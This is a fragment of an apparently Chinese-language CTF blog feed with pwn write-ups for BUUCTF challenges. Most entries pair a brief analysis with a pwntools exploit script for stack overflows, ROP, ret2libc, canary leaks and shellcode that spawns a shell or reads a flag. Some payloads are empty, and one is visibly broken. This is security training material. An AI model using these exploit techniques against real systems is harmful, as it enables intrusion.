class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27488</span>)<br><span class="hljs-comment">#io=process(&#x27;./49&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./49&#x27;</span>)<br><br>sh_addr=<span class="hljs-number">0x8048670</span><br>system_addr=<span class="hljs-number">0x8048529</span><br>padding=<span class="hljs-number">0x1c</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(system_addr)+p32(sh_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="50-bbys-tu-2016"><a href="#50-bbys-tu-2016" class="headerlink" title="50.bbys_tu_2016"></a>50.bbys_tu_2016</h1><h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105233326.png" alt="image-20231012105233326"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019093628174.png" alt="image-20231019093628174"></p><p>__isoc99_scanf漏洞</p><p>printFlag</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019093710374.png" alt="image-20231019093710374"></p><p>读了flag</p><h2 id="2-payload-9"><a href="#2-payload-9" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>31~40</title>
    <link href="/2023/09/22/WP/BUUCTF/31-40/"/>
    <url>/2023/09/22/WP/BUUCTF/31-40/</url>
    
    <content type="html"><![CDATA[<h1 id="31-picoctf-2018-rop-chain"><a href="#31-picoctf-2018-rop-chain" class="headerlink" title="31.picoctf_2018_rop chain"></a>31.picoctf_2018_rop chain</h1><h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821874.png" alt="image-20230922145334145"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821875.png" alt="image-20230922201416570"></p><p>vuln</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821876.png" alt="image-20230922201447196"></p><p>gets溢出漏洞</p><p>flag</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821877.png" alt="image-20230922201653145"></p><p>可以看到已经打开flag并且读到s中，只要条件if ( win1 &amp;&amp; win2 &amp;&amp; a1 &#x3D;&#x3D; -559039827 )符合就会给flag，同时我们发现在win_function2和win_function2函数中，分别将win1和win2赋值为1了，所以我们只要控制程序跳转执行这两个函数即可</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821878.png" alt="image-20230922202628371"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821879.png" alt="image-20230922202646477"></p><h2 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26111</span>)<br><span class="hljs-comment">#io=process(&#x27;./31&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./31&#x27;</span>)<br><br>win_function1_addr=<span class="hljs-number">0x80485cb</span><br>win_function2_addr=<span class="hljs-number">0x80485d8</span><br>flag_addr=<span class="hljs-number">0x804862b</span><br>a1=<span class="hljs-number">0xBAAAAAAD</span><br>a11=<span class="hljs-number">0xDEADBAAD</span><br>padding=<span class="hljs-number">0x1c</span><span class="hljs-comment">#偏移地址</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload += p32(win_function1_addr)<br>payload += p32(win_function2_addr)<br>payload += p32(flag_addr)+p32(a1)+p32(a11)<span class="hljs-comment">#a1是win_function2_addr的参数，a11是flag_addr的参数，参数全部按次序放后面</span><br><br>io.recvuntil(<span class="hljs-string">b&#x27;Enter your input&gt;&#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="32-babyheap-0ctf-2017"><a href="#32-babyheap-0ctf-2017" class="headerlink" title="*32.babyheap_0ctf_2017"></a>*32.babyheap_0ctf_2017</h1><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821880.png" alt="image-20230922145422420"></p><h2 id="2-payload-1"><a href="#2-payload-1" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="33-ez-pz-hackover-2016"><a href="#33-ez-pz-hackover-2016" class="headerlink" title="*33.ez_pz_hackover_2016"></a>*33.ez_pz_hackover_2016</h1><h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821881.png" alt="image-20230922145459077"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821882.png" alt="image-20230922205718319"></p><p>chall</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821883.png" alt="image-20230922205739654"></p><p>发现当s与crashme比较相同时，执行vuln函数</p><p>vuln</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821884.png" alt="image-20230922210628814"></p><p>返回主调函数看n和src，发现n是0x400，src是1023字节，明显会将dest溢出，那么我们就可以利用这个溢出点来进行攻击。由于程序没有NX保护，考虑用ret2shellcode进行攻击</p><h2 id="2-payload-2"><a href="#2-payload-2" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26111</span>)<br><span class="hljs-comment">#io=process(&#x27;./33&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./33&#x27;</span>)<br><br>io.recvuntill(<span class="hljs-string">b&#x27;Yippie, lets crash:&#x27;</span>)<br>s_addr=u32(io.recv(<span class="hljs-number">4</span>))<br>padding=<span class="hljs-number">0x3c</span><span class="hljs-comment">#偏移地址</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload += p32(win_function1_addr)<br>payload += p32(win_function2_addr)<br>payload += p32(flag_addr)+p32(a1)+p32(a11)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;Whats your name?\n&#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="34-wustctf2020-getshell"><a href="#34-wustctf2020-getshell" class="headerlink" title="34.wustctf2020_getshell"></a>34.wustctf2020_getshell</h1><h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821885.png" alt="image-20231008145526459"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821886.png" alt="image-20231008145840238"></p><p>vulnerable</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821887.png" alt="image-20231008145810639"></p><p>read漏洞，可溢出8字节</p><p>shell</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821888.png" alt="image-20231008145937856"></p><p>后门函数</p><h2 id="2-payload-3"><a href="#2-payload-3" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26462</span>)<br><span class="hljs-comment">#io=process(&#x27;./34&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./34&#x27;</span>)<br><br>shell_addr=<span class="hljs-number">0x804851b</span><br>padding=<span class="hljs-number">0x1c</span><span class="hljs-comment">#偏移地址</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload += p32(shell_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="35-jarvisoj-level3-x64"><a href="#35-jarvisoj-level3-x64" class="headerlink" title="35.jarvisoj_level3_x64"></a>35.jarvisoj_level3_x64</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821889.png" alt="image-20231008151346097"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821890.png" alt="image-20231008151316283"></p><p>vulnerable_function</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821891.png" alt="image-20231008151418570"></p><p>read漏洞</p><p>没有system和&#x2F;bin&#x2F;sh字符串，基本确定ret2libc</p><p>在ROPgadget中找到了rdi和rsi的返回地址，确认无误</p><h2 id="2-payload-4"><a href="#2-payload-4" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26140</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./35&#x27;</span>)<br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x4006b3</span><br>pop_rsi_r15_ret=<span class="hljs-number">0x4006b1</span><br><span class="hljs-comment">#ret=0x400499#有时栈平衡会需要这个gadget凑数</span><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>padding=<span class="hljs-number">0x88</span><span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1+=p64(pop_rdi_ret)+p64(<span class="hljs-number">1</span>)<span class="hljs-comment">#rdi寄存器设置write函数的第一个参数为‘1’</span><br>payload1+=p64(pop_rsi_r15_ret)+p64(write_got)+p64(<span class="hljs-number">4</span>)<span class="hljs-comment">#rsi寄存器设置write函数的第二个参数为write_got表的地址,r15寄存器设置write函数的第三个参数为8</span><br>payload1+=p64(write_plt)+p64(main_addr)   <span class="hljs-comment">#调用write函数</span><br><br>io.sendline(payload1)<br><span class="hljs-comment">#下面两行需要根据实际情况来获取泄露函数真实地址</span><br>io.recv()<br>write_addr=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(write_addr)))<br><span class="hljs-comment">#以下为通用操作</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write_addr)<br>libcbase = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>str_bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;libc=ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="hljs-string">libcbase = puts_addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="hljs-string">system_addr=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-string">str_bin_sh=libcbase+next(libc.search(b&quot;/bin/sh&quot;))&#x27;&#x27;&#x27;</span>            <br>            <br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="36-bjdctf-2020-babyrop2"><a href="#36-bjdctf-2020-babyrop2" class="headerlink" title="36.bjdctf_2020_babyrop2"></a>36.bjdctf_2020_babyrop2</h1><h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181821892.png" alt="image-20231009145714171"></p><p>开了canary保护，那我们就要在程序中看看有没有printf函数来泄露canary，因为这是相对简单的canary绕过方式</p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231009145807815.png" alt="image-20231009145807815"></p><p>gift</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231009145851278.png" alt="image-20231009145851278"></p><p>OK，printf字符串漏洞泄露canary</p><p>vuln</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231009145921892.png" alt="image-20231009145921892"></p><p>read函数漏洞</p><p>init</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231009150057377.png" alt="image-20231009150057377"></p><p>明示ret2libc了</p><p>那么我们找一下需要的gadgets</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231009204252154.png" alt="image-20231009204252154"></p><p>OK，rdi和rsi都找到了</p><p>那么接下来用gdb调试出printf字符串在栈上的位置</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231009205120474.png" alt="image-20231009205120474"></p><p>所以canary的偏移为7</p><p>好，准备工作全部完成，接下来就是构造payload，我们可以在模板上进行修改。</p><h2 id="2-payload-5"><a href="#2-payload-5" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26404</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./36&#x27;</span>)<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x400993</span><br>pop_rsi_r15_ret=<span class="hljs-number">0x400991</span><br><span class="hljs-comment">#ret=xxx</span><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>vuln_addr=elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>padding=<span class="hljs-number">0x20</span><span class="hljs-comment">#偏移地址</span><br><br><span class="hljs-comment">#canary</span><br>payload=<span class="hljs-string">b&quot;%7$p&quot;</span><br>io.sendlineafter(<span class="hljs-string">b&quot;u!\n&quot;</span>,payload)<br>io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>payload = p64(canary)<br><br><span class="hljs-comment">#ret2libc</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(padding-<span class="hljs-number">8</span>)+p64(canary)+p64(<span class="hljs-number">0</span>)<br>payload1+=p64(pop_rdi_ret)+p64(puts_got)<br>payload1+=p64(puts_plt)+p64(vuln_addr)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>io.sendline(payload1)<br><span class="hljs-comment">#下面两行需要根据实际情况来获取泄露函数真实地址</span><br><br>puts_addr=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak_puts_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><span class="hljs-comment">#以下为通用操作</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="hljs-string">libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="hljs-string">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="hljs-string">str_bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;64libc-2.23.so&#x27;</span>)<br>libcbase = puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))       <br>            <br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(padding-<span class="hljs-number">8</span>)+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="37-pwnable-orw"><a href="#37-pwnable-orw" class="headerlink" title="37.pwnable_orw"></a>37.pwnable_orw</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010160410570.png" alt="image-20231010160410570"></p><p>题目基本可以确定是ORW方法</p><p>介绍一下，ORW是开启了沙箱保护，简单来说就是系统调用被禁止了，不能通过子进程去获得权限和flag，只能在该进程通过 open , read ,write三个函数来得到flag</p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010200057639.png" alt="image-20231010200057639"></p><p>orw_seccomp</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010200126637.png" alt="image-20231010200126637"></p><blockquote><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的沙箱机制。在 Linux 系统里，大量的系统调用（syscall）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（syscall），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止</p></blockquote><p>可以看到orw_seccomp函数执行了两次prctl函数，第一次调用prctl函数 ——禁止提权，第二次调用prctl函数 ——限制能执行的系统调用只有open，write，exit</p><p>所以我们不能使用特殊的系统调用getshell，但是可以用open、read、write三个系统调用去读flag。这就是ORW方法</p><p>同时pwntools提供了对简单的shellcode的支持</p><p>另外自己写个shellcode也可以</p><p>打开flag文件，sys_open(file,0,0)；系统调用号为5</p><p>push 0x0  #字符串结尾<br>push 0x67616c66#’flag’  “flag字符串的16进制表示，由于小端序，所以是从右往左”<br>mov ebx,esp<br>xor ecx,ecx#0<br>xor edx,edx#0<br>mov eax,0x5#调用号<br>int 0x80#sys_open(flags,0,0)</p><p>读flag文件，sys_read(3,file,0x100)；系统调用号为3</p><p>mov eax,0x3;<br>mov ecx,ebx;# ecx &#x3D; char __user *buf 缓冲区，读出的数据–&gt;也就是读“flag”<br>mov ebx,0x3;# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件<br>mov edx,0x100;#对应字节数<br>int 0x80;</p><p>输出flag文件内容，sys_write(1,file,0x30)；系统调用号为4</p><p>mov eax,0x4;# eax &#x3D; sys_write<br>mov ebx,0x1;# ebx &#x3D; unsigned int fd &#x3D; 1<br>int 0x80;</p><h2 id="2-payload-6"><a href="#2-payload-6" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28626</span>)<br><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>payload = asm(shellcode)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="38-mrctf2020-shellcode"><a href="#38-mrctf2020-shellcode" class="headerlink" title="38.mrctf2020_shellcode"></a>38.mrctf2020_shellcode</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010203956818.png" alt="image-20231010203956818"></p><p>堆栈保护没开，应该是shellcode了</p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010214201180.png" alt="image-20231010214201180"></p><p>虽然没溢出，buf的字节给的很大，依然可以shellcode</p><h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29643</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./38&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="39-jarvisoj-level4"><a href="#39-jarvisoj-level4" class="headerlink" title="39.jarvisoj_level4"></a>39.jarvisoj_level4</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010215026099.png" alt="image-20231010215026099"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010215214791.png" alt="image-20231010215214791"></p><p>vulnerable_function</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010215229142.png" alt="image-20231010215229142"></p><p>溢出24字节</p><h2 id="2-payload-8"><a href="#2-payload-8" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 